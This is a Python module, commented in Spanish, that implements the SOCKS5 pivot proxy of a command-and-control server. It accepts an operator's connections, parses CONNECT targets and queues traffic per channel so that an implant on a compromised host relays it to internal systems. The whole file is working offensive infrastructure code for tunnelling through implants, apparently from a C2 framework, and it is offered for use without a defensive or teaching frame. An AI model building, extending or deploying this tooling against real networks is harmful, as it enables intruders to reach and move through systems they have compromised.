"""Servidor SOCKS5 local para el C2 server.

Permite al operador conectarse vía SOCKS5 y que el tráfico
se encamine a través del implant al objetivo final.

Flujo:
  1. Operador se conecta al proxy SOCKS5 local (ej: proxychains).
  2. El servidor SOCKS5 acepta la conexión y parsea el CONNECT target.
  3. Se crea un canal único (channel_id) con colas bidireccionales.
  4. Se envía un task al implant para que abra conexión al target.
  5. El relay loop mueve datos entre el socket del operador y las colas.
  6. El implant consume/envía datos vía los endpoints /socks/data.
"""
import socket
import struct
import threading
import time
import logging
from queue import Queue, Empty

log = logging.getLogger("c2.socks")


# SOCKS5 constants
SOCKS5_VERSION = 0x05
SOCKS5_AUTH_NONE = 0x00
SOCKS5_CMD_CONNECT = 0x01
SOCKS5_ATYP_IPV4 = 0x01
SOCKS5_ATYP_DOMAIN = 0x03
SOCKS5_ATYP_IPV6 = 0x04
SOCKS5_REP_OK = 0x00
SOCKS5_REP_CONN_REFUSED = 0x05


class SOCKSServer:
    """Servidor SOCKS5 que encamina tráfico a través del canal C2."""

    def __init__(self, host="127.0.0.1", port=1080):
        self.host = host
        self.port = port
        self.server_socket = None
        self.running = False
        self.channels = {}  # channel_id -> channel dict
        self.lock = threading.Lock()

    def start(self):
        """Inicia el servidor SOCKS5."""
        if self.running:
            log.warning("SOCKS5 server already running")
            return

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        self.running = True

        log.info("SOCKS5 server listening on %s:%s", self.host, self.port)

        # Aceptar conexiones en thread separado
        self.thread = threading.Thread(target=self._accept_connections, daemon=True)
        self.thread.start()

    def _accept_connections(self):
        """Acepta conexiones SOCKS5 de clientes (operadores)."""
        while self.running:
            try:
                client_socket, addr = self.server_socket.accept()
                log.info("SOCKS5 connection from %s", addr)

                # Manejar cada conexión en thread separado
                handler = threading.Thread(
                    target=self._handle_client,
                    args=(client_socket,),
                    daemon=True,
                )
                handler.start()
            except OSError:
                break

    def _handle_client(self, client_socket):
        """Maneja una conexión SOCKS5 de un cliente."""
        channel_id = None
        try:
            # Handshake SOCKS5
            data = client_socket.recv(256)
            if not data or data[0] != SOCKS5_VERSION:
                client_socket.close()
                return

            # Responder: sin autenticación
            client_socket.sendall(
                struct.pack("!BB", SOCKS5_VERSION, SOCKS5_AUTH_NONE)
            )

            # Recibir solicitud
            data = client_socket.recv(256)
            if not data or len(data) < 4:
                client_socket.close()
                return

            atyp = data[3]

            # Parsear dirección
            if atyp == SOCKS5_ATYP_IPV4:
                addr = socket.inet_ntoa(data[4:8])
                port = struct.unpack("!H", data[8:10])[0]
            elif atyp == SOCKS5_ATYP_DOMAIN:
                domain_len = data[4]
                addr = data[5 : 5 + domain_len].decode()
                port = struct.unpack("!H", data[5 + domain_len : 7 + domain_len])[0]
            elif atyp == SOCKS5_ATYP_IPV6:
                addr = socket.inet_ntop(socket.AF_INET6, data[4:20])
                port = struct.unpack("!H", data[20:22])[0]
            else:
                self._send_error(client_socket, SOCKS5_REP_CONN_REFUSED)
                return

            target = f"{addr}:{port}"
            log.info("SOCKS5 CONNECT request to %s", target)

            # Generar channel_id único
            channel_id = f"socks_{int(time.time() * 1000)}"

            # Almacenar canal con colas bidireccionales
            with self.lock:
                self.channels[channel_id] = {
                    "client_socket": client_socket,
                    "target": target,
                    "target_host": addr,
                    "target_port": port,
                    "send_queue": Queue(),   # operator -> implant -> target
                    "recv_buffer": Queue(),  # target -> implant -> operator
                    "connected": False,
                    "created": time.time(),
                }

            # Responder éxito al cliente SOCKS5
            reply = struct.pack(
                "!BBBB",
                SOCKS5_VERSION,
                SOCKS5_REP_OK,
                0x00,
                SOCKS5_ATYP_IPV4,
            )
            reply += socket.inet_aton("0.0.0.0") + struct.pack("!H", 0)
            client_socket.sendall(reply)

            # Mantener conexión y relay de datos
            self._relay_loop(client_socket, channel_id)

        except Exception as e:
            log.error("SOCKS5 client error: %s", e)
        finally:
            if channel_id:
                self._cleanup_channel(channel_id)
            client_socket.close()

    def _relay_loop(self, client_socket, channel_id):
        """Loop de relay de datos entre cliente y canal C2.

        Lee datos del socket del operador y los mete en send_queue.
        Lee datos de recv_buffer y los envía al socket del operador.
        """
        client_socket.settimeout(0.5)

        while self.running:
            # 1. Leer datos del operador -> send_queue (para implant)
            try:
                data = client_socket.recv(65536)
                if not data:
                    log.info("SOCKS5 operator disconnected from %s", channel_id)
                    break
                with self.lock:
                    ch = self.channels.get(channel_id)
                    if ch:
                        ch["send_queue"].put(data)
                        log.debug(
                            "SOCKS5 relay %s: operator sent %d bytes",
                            channel_id,
                            len(data),
                        )
            except socket.timeout:
                pass
            except socket.error:
                break

            # 2. Enviar datos del recv_buffer al operador
            try:
                with self.lock:
                    ch = self.channels.get(channel_id)
                    if ch:
                        try:
                            data = ch["recv_buffer"].get_nowait()
                            client_socket.sendall(data)
                            log.debug(
                                "SOCKS5 relay %s: sent %d bytes to operator",
                                channel_id,
                                len(data),
                            )
                        except Empty:
                            pass
            except socket.error:
                break

            time.sleep(0.01)  # Pequeña pausa para no quemar CPU

    def get_pending_data(self, channel_id):
        """Implant consulta: obtiene datos pendientes del send_queue.

        Returns:
            bytes o None si no hay datos.
        """
        with self.lock:
            ch = self.channels.get(channel_id)
            if not ch:
                return None
            try:
                return ch["send_queue"].get_nowait()
            except Empty:
                return None

    def push_data_from_implant(self, channel_id, data):
        """Implant envía: mete datos en recv_buffer para el operador.

        Args:
            channel_id: ID del canal SOCKS
            data: bytes recibidos del target remoto
        """
        with self.lock:
            ch = self.channels.get(channel_id)
            if ch:
                ch["recv_buffer"].put(data)
                log.debug(
                    "SOCKS5 relay %s: implant pushed %d bytes",
                    channel_id,
                    len(data),
                )

    def mark_connected(self, channel_id):
        """Marca un canal como conectado al target."""
        with self.lock:
            ch = self.channels.get(channel_id)
            if ch:
                ch["connected"] = True

    def _send_error(self, client_socket, error_code):
        """Envía respuesta de error SOCKS5."""
        reply = struct.pack(
            "!BBBB", SOCKS5_VERSION, error_code, 0x00, SOCKS5_ATYP_IPV4
        )
        reply += socket.inet_aton("0.0.0.0") + struct.pack("!H", 0)
        client_socket.sendall(reply)

    def _cleanup_channel(self, channel_id):
        """Limpia un canal SOCKS."""
        with self.lock:
            if channel_id in self.channels:
                ch = self.channels[channel_id]
                # Vaciar colas
                while not ch["send_queue"].empty():
                    try:
                        ch["send_queue"].get_nowait()
                    except Empty:
                        break
                while not ch["recv_buffer"].empty():
                    try:
                        ch["recv_buffer"].get_nowait()
                    except Empty:
                        break
                del self.channels[channel_id]
                log.info("SOCKS5 channel %s cleaned up", channel_id)

    def stop(self):
        """Detiene el servidor SOCKS5."""
        self.running = False
        if self.server_socket:
            self.server_socket.close()

        # Cerrar todos los canales
        with self.lock:
            for channel_id in list(self.channels.keys()):
                try:
                    self.channels[channel_id]["client_socket"].close()
                except Exception:
                    pass
            self.channels.clear()

        log.info("SOCKS5 server stopped")


# Instancia global del servidor SOCKS
socks_server = SOCKSServer()
